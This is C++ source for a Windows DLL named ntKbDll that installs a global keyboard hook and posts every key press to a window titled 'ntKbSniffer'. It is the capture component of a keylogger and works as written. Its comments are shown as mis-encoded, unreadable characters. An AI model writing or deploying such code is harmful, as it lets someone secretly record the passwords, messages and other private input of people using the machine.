// ntKbDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "ntKbDll.h"

#pragma data_seg(".SHAREDATA")//Shared data among all instances.
HHOOK hook = NULL;
HWND hwnd = NULL;
#pragma data_seg()

#pragma comment(linker, "/SECTION:.SHAREDATA,RWS")//linker directive

HINSTANCE hinstance = NULL;


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
    }
	
	hinstance = (HINSTANCE)hModule;
	hook = NULL;

	return TRUE;
}

NTKBDLL_API void InstallHook(HWND h)
{
	hook = NULL;
	hwnd = h;
	hook = SetWindowsHookEx(WH_KEYBOARD,KeyboardProc,hinstance,NULL);
	if(hook==NULL)
		MessageBox(NULL,"Unable to install hook","Error!",MB_OK);
}

NTKBDLL_API void RemoveHook()
{
	UnhookWindowsHookEx(hook);
}

NTKBDLL_API LRESULT CALLBACK KeyboardProc(int ncode,WPARAM wparam,LPARAM lparam)
{
	if(ncode>=0)
	{
		//�����Ƿ񱻰�ס�������ɿ�����
		if((lparam & 0x80000000) == 0x00000000)
		{
			//����Ӧ�õĴ��ھ��
			hwnd = FindWindow("#32770","ntKbSniffer");
			//��������Ϣ����������
			PostMessage(hwnd,WM_KEYSTROKE,wparam,lparam);
		}
	}
	//������Ȩ�����������е���һ������
	return ( CallNextHookEx(hook,ncode,wparam,lparam) );
}
